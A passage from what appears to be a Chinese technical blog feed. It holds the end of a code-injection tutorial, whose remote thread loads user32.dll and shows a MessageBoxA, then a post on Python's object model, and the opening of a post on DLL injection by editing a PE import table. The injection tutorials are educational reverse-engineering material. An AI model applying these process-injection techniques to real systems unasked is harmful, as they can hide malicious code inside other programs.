<span class="title function_">ThreadProc</span><span class="params">(LPVOID lParam)</span></span><br><span class="line">&#123;</span><br><span class="line">    PTHREAD_PARAM   pParam      = (PTHREAD_PARAM)lParam;</span><br><span class="line">    HMODULE         hMod        = <span class="literal">NULL</span>;</span><br><span class="line">    FARPROC         pFunc       = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);    </span><br><span class="line">    <span class="keyword">if</span>( !hMod )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);  </span><br><span class="line">    <span class="keyword">if</span>( !pFunc )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// MessageBoxA()</span></span><br><span class="line">    ((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参数只有一个<code>lParam</code>是一个结构体</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">THREAD_PARAM</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    FARPROC pFunc[<span class="number">2</span>];       </span><br><span class="line">    <span class="type">char</span>    szBuf[<span class="number">4</span>][<span class="number">128</span>];     </span><br><span class="line">&#125; THREAD_PARAM, *PTHREAD_PARAM;</span><br></pre></td></tr></table></figure><p>其中<code>THREAD_PARAM.pFunc</code>存放的是两个API的调用地址：LoadLibraryA(), GetProcAddress()，都是kernel32.dll的API。</p><p><code>THREAD_PARAM.szBuf</code>存放的是线程执行需要用到的4个字符串</p><p>分别是：<code>user32.dll</code>，<code>MessageBoxA</code>，<code>www.reversecore.com</code>，<code>ReverseCore</code>。</p><p>因此：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hMod = ((PFLOADLIBRARYA)pParam-&gt;pFunc[<span class="number">0</span>])(pParam-&gt;szBuf[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure><p>完成的是使用<code>kernel32.LoadLibraryA</code>将user32.dll进行载入，载入后模块句柄存放在hMod中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pFunc = (FARPROC)((PFGETPROCADDRESS)pParam-&gt;pFunc[<span class="number">1</span>])(hMod, pParam-&gt;szBuf[<span class="number">1</span>]);</span><br></pre></td></tr></table></figure><p>完成的是使用<code>kernel32.GetProcAddress</code>获取<code>user32.MessageBoxA</code>的地址，存放到<code>pFunc</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((PFMESSAGEBOXA)pFunc)(<span class="literal">NULL</span>, pParam-&gt;szBuf[<span class="number">2</span>], pParam-&gt;szBuf[<span class="number">3</span>], MB_OK);</span><br></pre></td></tr></table></figure><p>这一步完成的是对MessageBoxA的调用。可以看到，上述许多位置都用到了类型转换，保证程序的运行。</p><p>执行完线程内容，回到InjectCode，完成痕迹擦出</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">WaitForSingleObject(hThread, INFINITE);</span><br><span class="line"></span><br><span class="line">CloseHandle(hThread);</span><br><span class="line">CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br></pre></td></tr></table></figure><h4 id="回顾"><a href="#回顾" class="headerlink" title="回顾"></a>回顾</h4><img src="/2022/05/06/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-11-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5/3.png" class=""><p>动手调试，很容易可以看出代码注入区别于DLL的方式在于所有完成ThreadPro过程的重要数据都是从[ebp+8]接受使用的，使用的地址是相对地址而不是DLL那样的硬编码地址。另外CodeInject中的ThreadProc也是可以独立运行的代码。</p>]]></content>
      
      
      <categories>
          
          <category> -逆向 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 《逆向工程核心原理学习》 </tag>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python源码剖析No.2--对象模型概述</title>
      <link href="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/"/>
      <url>/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="Python源码剖析–对象模型概述"><a href="#Python源码剖析–对象模型概述" class="headerlink" title="Python源码剖析–对象模型概述"></a>Python源码剖析–对象模型概述</h3><p>引用<a href="https://zh.wikipedia.org/wiki/Python">维基百科</a>中对python的描述</p><blockquote><p>Python支持多种编程范型，包括函数式、指令式、反射式、结构化和面向对象编程。它拥有<a href="https://zh.wikipedia.org/wiki/%E9%A1%9E%E5%9E%8B%E7%B3%BB%E7%B5%B1">动态类型系统</a>和<a href="https://zh.wikipedia.org/wiki/%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6_(%E8%A8%88%E7%AE%97%E6%A9%9F%E7%A7%91%E5%AD%B8)">垃圾回收</a>功能，能够自动管理内存使用，并且其本身拥有一个巨大而广泛的标准库。它的语言结构以及<a href="https://zh.wikipedia.org/wiki/%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%A8%8B%E5%BA%8F%E8%AE%BE%E8%AE%A1">面向对象</a>的方法旨在帮助程序员为小型的和大型的项目编写清晰的、合乎逻辑的代码。</p></blockquote><h4 id="Python中一切皆对象"><a href="#Python中一切皆对象" class="headerlink" title="Python中一切皆对象"></a>Python中一切皆对象</h4><p>什么是对象？</p><blockquote><p>狭义点的解释，用类（python内置的和你自定义的）创建的实例就是对象，在python中，对象和实例在概念上可以理解为同一个东西</p><p>source：<a href="https://www.zhihu.com/question/470739066">LINK</a></p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>i =<span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(i)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">class</span> <span class="title class_">demo</span>():</span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line"><span class="meta">... </span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d = demo()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(d)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.demo&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p><strong>对象对应内存中的一块区域，这些区域存放着对应对象的信息</strong>，上述代码中 i 、d都是对应着内存中的一块区域，的d、i都是对象。</p><p>一切皆对象怎么理解？</p><blockquote><p>一切皆对象，python把他们视为一类事物。相比于其他语言，python由于一切皆对象，就能做一些其他语言干不了的事情，比如直接把一个函数作为另一个函数的参数，再比如为一个函数设置属性，因为函数它在python也视若对象</p><p>source：<a href="https://www.zhihu.com/question/470739066">LINK</a></p></blockquote><h4 id="类型对象"><a href="#类型对象" class="headerlink" title="类型对象"></a>类型对象</h4><p>整数类型、浮点类型在python中也是对象，称之为<strong>类型对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">float</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><h4 id="示例对象"><a href="#示例对象" class="headerlink" title="示例对象"></a>示例对象</h4><p>可以将类型对象进行示例化，可以得到一个整数对象（浮点对象），称为<strong>实例对象</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">int</span>(<span class="string">&#x27;1024&#x27;</span>)</span><br><span class="line"><span class="number">1024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">float</span>(<span class="string">&#x27;3.14&#x27;</span>)</span><br><span class="line"><span class="number">3.14</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="number">1024</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="number">3.14</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;float&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/1.png" class=""><p>面向对象理念中“类”和“对象”这两个基本概念在python中都是通过对象来实现的，这也是python最大的特点</p><p>type方法可以查看对象的类型，查看实例化对象的类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">1024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(a)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;int&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>那么使用type查看类型对象的类型会如何呢？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="built_in">int</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">isinstance</span>(<span class="built_in">int</span>,<span class="built_in">type</span>)//类型对象<span class="built_in">int</span>的类型是<span class="built_in">type</span>，相比于<span class="built_in">type</span>函数，则是会考虑继承关系</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>可以看到，类型对象也是属于类型的，其类型是type，同样的对于float也是一致的。</p><p>那么问题给到：type类型又是什么？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(<span class="built_in">type</span>)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>结果type的类型是type，指向自身。</p><hr><p>python中存在一个特殊类型，所有其他类型均继承于object类型，即：object类型是所有其他类型的基类，其他类型均是从object中派生出来的：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">issubclass</span>(<span class="built_in">int</span>,<span class="built_in">object</span>)//查看继承关系</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">issubclass</span>(<span class="built_in">type</span>,<span class="built_in">object</span>)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><p>关系示意图：</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/2.png" class=""><p>看下自定义类的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dog</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">yelp</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;woof&#x27;</span>)</span><br><span class="line">dog = Dog()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(Dog))//&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(Dog,<span class="built_in">type</span>))//<span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(Dog,<span class="built_in">object</span>))//<span class="literal">True</span></span><br></pre></td></tr></table></figure><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/3.png" class=""><p>再看下自定义子类的情况</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Teddy</span>(<span class="title class_ inherited__">Dog</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sort</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">t = Teddy()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(t))//&lt;<span class="keyword">class</span> <span class="string">&#x27;__main__.Teddy&#x27;</span>&gt;</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">isinstance</span>(Teddy,<span class="built_in">type</span>))//<span class="literal">True</span>，<span class="built_in">isinstance</span>函数考察继承关系</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">issubclass</span>(Teddy,<span class="built_in">object</span>))//<span class="literal">True</span></span><br></pre></td></tr></table></figure><p>说明自定义子类的类型依旧是type，且是object的子类</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/4.png" class=""><hr><h4 id="type-amp-object"><a href="#type-amp-object" class="headerlink" title="type &amp; object"></a>type &amp; object</h4><p>深究type &amp; object两个特殊的类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">object</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(<span class="built_in">type</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#---------output---------#</span></span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;type&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>可以看出，作为所有类型的类型type其类型指向其本身，作为所有类的基类的object其类型依旧是type</p><p>另外作为所有类的基类–object，理论上也是type的基类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">issubclass</span>(<span class="built_in">type</span>,<span class="built_in">object</span>)//<span class="literal">True</span></span><br></pre></td></tr></table></figure><p>按照上述理论，object也应该是自身的基类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">issubclass</span>(<span class="built_in">object</span>,<span class="built_in">object</span>)//<span class="literal">True</span></span><br></pre></td></tr></table></figure><p>简言之：type是所有类型的类型，type类型指向自身。object是所有类的基类，object基类指向其自身。</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/5.png" class=""><h4 id="变量名-amp-变量空间"><a href="#变量名-amp-变量空间" class="headerlink" title="变量名 &amp; 变量空间"></a>变量名 &amp; 变量空间</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line">b = a</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(b))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------output------------#</span></span><br><span class="line"><span class="number">4402723168</span></span><br><span class="line"><span class="number">4402723168</span></span><br></pre></td></tr></table></figure><p>上述代码中变量a、b的指向地址空间是一样的，都知道在大多数语言（C语言为例），定义变量a、b意味着为其分配内存空间用于存放变量值，b &#x3D; a相当于copy一份a的值到b指向的变量空间中</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/6.png" class=""><p>然而在一切都是对象的python中，<strong>变量名仅仅是一个与对象关联的名字</strong>，<strong>a &#x3D; b的含义是将变量名b与变量名a指向的对象关联起来</strong></p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/7.png" class=""><p>简言之：在python中，<strong>变量名存放的是指向对象的一个指针，变量之间的赋值只是拷贝指针</strong></p><hr><h4 id="可变对象-amp-不可变对象"><a href="#可变对象-amp-不可变对象" class="headerlink" title="可变对象&amp;不可变对象"></a>可变对象&amp;不可变对象</h4><p>不可变对象指的是在对象创建后，不可对其值进行修改，若强行修改会改变变量名指向对象的变动，此为不可变的含义</p><p>可变对象指的是在对象创建后，可对其值进行修改，即便修改也不会改变变量指向的对象，此为可变的含义</p><p>以下为python代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"></span><br><span class="line">a += <span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(a))</span><br><span class="line"><span class="comment">#-----------python output-------------#</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4402723168</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4402723200</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-----------C supposed output-------------#</span></span><br><span class="line"><span class="number">1</span></span><br><span class="line"><span class="number">4402723168</span></span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="number">4402723168</span></span><br></pre></td></tr></table></figure><p>可以看到，python对于变量a做值的修正会改变变量a指向的对象，实际上在python中，对变量的值进行修正，python将为修正的结果创建新对象，并将变量名这一存放对象指针的内容修改为更正后的对象位置，原对象若没有被引用将有垃圾回收机制完成资源回收：</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/8.png" class=""><blockquote><p>显然每次对变量做修改会设计修改结果后的对象创建以及可能存在的旧对象的销毁，这无疑会增加运行的开销，导致效率很低。python也存在相应的机制进行回避（后续探讨）</p></blockquote><p><strong>至此，可以知道int类型的实例对象是属于不可变对象，因为修改其值会改变变量指向的对象。</strong></p><p>再来一个可变对象的例子，python中的列表对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">l = [<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(l))</span><br><span class="line"></span><br><span class="line">l.append(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(l)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(l))</span><br><span class="line"><span class="comment">#----------------output------------#</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>]</span><br><span class="line"><span class="number">140253034107840</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"><span class="number">140253034107840</span></span><br></pre></td></tr></table></figure><p>可以看到，往<strong>列表对象l中添加元素，会修改对象的内容，却不会对变量名l指向的对象做修改（地址不变）</strong></p><p>实际在python中，列表对象内部维护者一个动态数组，其中存储着每一个元素对象的指针：</p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/9.png" class=""><h4 id="定长对象-amp-变长对象"><a href="#定长对象-amp-变长对象" class="headerlink" title="定长对象 &amp; 变长对象"></a>定长对象 &amp; 变长对象</h4><p>Python的对象占多大空间，相同类型的对象的大小是否一致..回答诸如此类问题，需要考察影响对象大小的因素</p><p>python的sys库提供了查看对象大小的函数，getsizeof，以int类型为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="number">10000000000000</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="number">1000000000000000000000000000000000</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#-------------------output----------------#</span></span><br><span class="line"><span class="number">28</span></span><br><span class="line"><span class="number">32</span></span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><p><strong>由此可见，int对象的大小和其数值有关，像int这样大小不固定的对象称为变长对象</strong></p><p>在许多语言中，以C为例，位数固定的整数能够表示的数值范围是有限的，超过这个限制范围，会造成溢出，带来诸多安全隐患。在Python中，为了解决整数溢出的问题，采取类似C++中的大整数类（以串联多个普通的整数）来实现对更大数值范围的支持，<strong>至于需要串联几个这样的整数则是要视具体需要表示的情况而定。</strong>（这就是<strong>变长</strong>的体现了）</p><p>加上前面对与可变与不可变对象的讨论中明确的int整型变量属于不可变对象，我们知道了<strong>int声明的变量指向对象为变长且不可变对象的</strong>，<strong>因为int变量需要视具体数值确定所占空间的大小（变长），以及在初始化后对值的修改会指向一个存放新数值的对象（不可变）</strong></p><img src="/2022/05/05/Python%E6%BA%90%E7%A0%81%E5%89%96%E6%9E%90-%E5%AF%B9%E8%B1%A1%E6%A8%A1%E5%9E%8B%E6%A6%82%E8%BF%B0/10.png" class=""><p>同样的变长对象的另一个典型例子是字符串对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="string">&#x27;ab&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="string">&#x27;abc&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------output---------------#</span></span><br><span class="line"><span class="number">50</span></span><br><span class="line"><span class="number">51</span></span><br><span class="line"><span class="number">52</span></span><br></pre></td></tr></table></figure><p>那么定长对象有什么例子呢？ – float对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="number">1.00</span>))</span><br><span class="line"><span class="built_in">print</span>(sys.getsizeof(<span class="number">100000000000000000000000000000000000000.00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#------------output---------------#</span></span><br><span class="line"><span class="number">24</span></span><br><span class="line"><span class="number">24</span></span><br></pre></td></tr></table></figure><p>python中的浮点数其背后是由double实现的，就算表示的数值很大，也不会改变浮点数对象所占的大小，之所以能表示这么大范围是因为其牺牲了表达的精度。但double由于位数固定，表示的范围终究有限，一旦超出范围，则会抛出异常。</p>]]></content>
      
      
      <categories>
          
          <category> 源码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python源码剖析 </tag>
            
            <tag> 源码 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>逆核系列No.10--修改PE文件注入DLL</title>
      <link href="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/"/>
      <url>/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/</url>
      
        <content type="html"><![CDATA[<h3 id="本节内容"><a href="#本节内容" class="headerlink" title="本节内容"></a>本节内容</h3><p>通过修改PE相应内容达到加载DLL的功能，参考书《逆向工程核心原理》</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/PE.JPG" class=""><hr><h4 id="IMPORT-TABLE"><a href="#IMPORT-TABLE" class="headerlink" title="IMPORT TABLE"></a>IMPORT TABLE</h4><p>通过先前PE格式的相关学习，了解到PE文件中的IMPORT TABLE记录着载入的模块以及相应的导入函数信息</p><p>IMPORT TABLE导入表的起始地址位于PE格式中的OptionalHeader.DataDirectory[16]中第二个元素，使用PE-view查看：</p><p>（PS：建议还不熟悉PE格式的手动进行字段值的查找练习）</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/1.png" class=""><p>读取出来的IMPORT TABLE的RVA &#x3D; 0x000084CC，结合各个节区头信息：</p><img src="/2022/05/05/%E9%80%86%E6%A0%B8%E7%B3%BB%E5%88%97No-10-%E4%BF%AE%E6%94%B9PE%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5DLL/2.png" class=""><p>因此0x000084CC位于节区.rdata，转换成RAW：<code>0x000084CC-0x00006000+0x00005200 = 0x000076CC</code>HxD下跟随到该地址：</p><img 